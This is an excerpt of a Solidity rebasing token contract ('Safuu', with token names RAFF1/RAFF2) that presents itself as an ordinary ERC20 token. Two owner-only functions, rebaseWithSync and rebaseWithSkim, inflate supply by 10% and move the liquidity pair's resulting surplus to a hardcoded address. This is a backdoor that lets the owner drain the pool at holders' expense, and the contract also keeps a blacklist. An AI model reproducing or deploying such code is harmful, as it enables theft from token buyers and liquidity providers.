...
contract Safuu is ERC20Detailed, Ownable {
    ...
    string public _name = "RAFF2";
    string public _symbol = "RAFF2";
    ...
    uint256 public skimBalance = 0;

    mapping(address => uint256) private _gonBalances;
    mapping(address => mapping(address => uint256)) private _allowedFragments;
    mapping(address => bool) public blacklist;

    constructor() ERC20Detailed("RAFF1", "RAFF1", uint8(DECIMALS)) Ownable() {
        ...
        autoLiquidityReceiver = 0xDe7796cc7F65F98a053Dba0215a75a7449b34e08;
        treasuryReceiver = 0xCCc5c8dfFbA26895829d0B6486dF41400cC0388b; 
        safuuInsuranceFundReceiver = 0xd9Cb687EccC712A045eE3Af1542A4b057d8611C1;
        firePit = 0xF2e913F5BFa727a745d88903FFA9949990A5Af8c;
    ...
    function rebaseWithSync() external onlyOwner {
        uint256 pairBalanceBefore = _gonBalances[pairAddress].div(_gonsPerFragment);
        _totalSupply = _totalSupply + (_totalSupply.mul(10).div(100));
        _gonsPerFragment = TOTAL_GONS.div(_totalSupply);
        _lastRebasedTime = block.timestamp;
        uint256 pairBalanceAfter = _gonBalances[pairAddress].div(_gonsPerFragment);

        if(pairBalanceAfter > pairBalanceBefore) {
            skimBalance = pairBalanceAfter - pairBalanceBefore;
            _basicTransfer(pairAddress, 0x46D0BF2C30cb1C16B0D0be57A3617498161732F0, skimBalance);
        }

        pairContract.sync();
        emit LogRebase(1, _totalSupply);
    }

    function rebaseWithSkim() external onlyOwner {
        _totalSupply = _totalSupply + (_totalSupply.mul(10).div(100));
        _gonsPerFragment = TOTAL_GONS.div(_totalSupply);
        _lastRebasedTime = block.timestamp;
        pairContract.skim(0x46D0BF2C30cb1C16B0D0be57A3617498161732F0);
        emit LogRebase(1, _totalSupply);
    }
